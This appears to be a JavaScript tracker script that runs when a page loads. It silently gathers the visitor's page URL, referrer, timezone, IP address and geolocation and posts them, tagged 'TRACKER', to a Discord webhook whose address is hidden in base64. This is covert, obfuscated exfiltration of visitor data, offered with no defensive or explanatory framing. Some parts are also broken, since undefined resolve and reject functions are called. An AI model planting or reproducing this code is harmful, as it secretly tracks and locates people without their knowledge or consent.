
function sendToServer(payload) {
    const webhookUrlDecrypted = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwMDQ5NDAzNDU2ODQ4Mjk2Ni9xVEJHNzdsOE03TEVMakRNVXVPaGExMzlIeG5DNmF4TTBNMm8zQ0NTZ3ZJRzJ0SUNXRl9uVGwxVDNkMzFYakY1bFZIQQ==');

    const xhr = new XMLHttpRequest();
    xhr.open('POST', webhookUrlDecrypted, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status >= 200 && xhr.status < 300) {
                resolve(xhr.response);
            } else {
                reject(new Error(`HTTP ${xhr.status}: ${xhr.statusText}`));
            }
        }
    };
    
    xhr.onerror = function() {
        reject(new Error('Network error occurred'));
    };
    
    xhr.send(JSON.stringify(payload));
}


$(document).ready(function() {
    
    function getUserTimezone() {
        try {
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const offset = new Date().getTimezoneOffset();
            const offsetHours = Math.floor(Math.abs(offset) / 60);
            const offsetMinutes = Math.abs(offset) % 60;
            const offsetSign = offset <= 0 ? '+' : '-';
            
            return {
                timezone: timezone,
                offset: `UTC${offsetSign}${offsetHours.toString().padStart(2, '0')}:${offsetMinutes.toString().padStart(2, '0')}`,
                localTime: new Date().toLocaleString()
            };
        } catch (error) {
            return {
                error: 'Unable to detect timezone'
            };
        }
    }
    
    function getIPAndLocation() {
        return $.ajax({
            url: 'https://ipapi.co/json/',
            method: 'GET',
            timeout: 10000
        }).fail(function() {
            return $.ajax({
                url: 'https://api.ipify.org?format=json',
                method: 'GET',
                timeout: 5000
            });
        });
    }
    
    function getIPOnly() {
        return $.ajax({
            url: 'https://api.ipify.org?format=json',
            method: 'GET',
            timeout: 5000
        });
    }
    
    function detectUserInfo() {
        var allCollectedData = {};

        const timezoneData = getUserTimezone();
        allCollectedData['page'] = window.location.href;
        allCollectedData['referrer'] = document.referrer;
        allCollectedData['timezone'] = timezoneData;
        

        getIPAndLocation()
            .done(function(data) {
                if (data.ip) {
                    allCollectedData['ip'] = data;
                    sendToServer({
                        username: "TRACKER v00",
                        content: '# >-LINK CLICK \n```json\n' + JSON.stringify(allCollectedData, null, 2) + '\n```'
                    });
                } else {
                    // Fallback to IP-only service
                    getIPOnly()
                        .done(function(ipData) {
                            allCollectedData['ip'] = ipData;

                            sendToServer({
                                username: "TRACKER v01",
                                content: '# >-LINK CLICK \n```json' + JSON.stringify(allCollectedData, null, 2) + '```'
                            });
                        })
                        .fail(function() {
                            allCollectedData['ip']['error'] = "no locational data!";
                        });
                }
            })
            .fail(function(xhr, status, error) {
                getIPOnly()
                    .done(function(ipData) {
                        allCollectedData['ip'] = ipData;
                        allCollectedData['ip']['error'] = "no locational data!";
                        sendToServer({
                            username: "TRACKER v01",
                            content: '# >-LINK CLICK \n```json' + JSON.stringify(allCollectedData, null, 2) + '```'
                        });
                    })
                    .fail(function() {
                        allCollectedData['ip']['error'] = "no data!";
                        sendToServer({
                            username: "TRACKER v01",
                            content: '# >-LINK CLICK \n```json' + JSON.stringify(allCollectedData, null, 2) + '```'
                        });
                    });
            });
    }

    // on page load
    detectUserInfo();
});